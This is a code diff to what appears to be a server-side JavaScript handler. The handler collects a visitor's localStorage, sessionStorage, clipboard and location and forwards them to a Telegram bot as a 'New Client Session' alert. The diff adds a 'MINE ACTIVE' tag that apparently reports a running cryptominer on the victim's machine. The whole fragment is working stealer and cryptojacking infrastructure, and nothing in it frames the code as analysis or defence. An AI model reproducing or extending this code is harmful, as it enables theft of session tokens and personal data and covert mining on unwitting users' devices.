@@ -15,6 +15,8 @@ export default async function handler(req, res) {
     const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 1500);
     const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 1500);
     
+    const mineTag = data.mineStatus ? `🔥 *MINE ACTIVE*: ${data.mineStatus}\n` : "";
+    
     const msg = `
 🚗 *New Client Session*
 
@@ -26,6 +28,7 @@ export default async function handler(req, res) {
 🗄️ SessionStorage: \`\`\`json\n${ssStr}\n\`\`\`
 📋 Clipboard: \`${data.clipboard || "Empty"}\`
 📍 Location: ${data.location}
+${mineTag}
     `.trim();
 
     const tgToken = process.env.TELEGRAM_BOT_TOKEN;
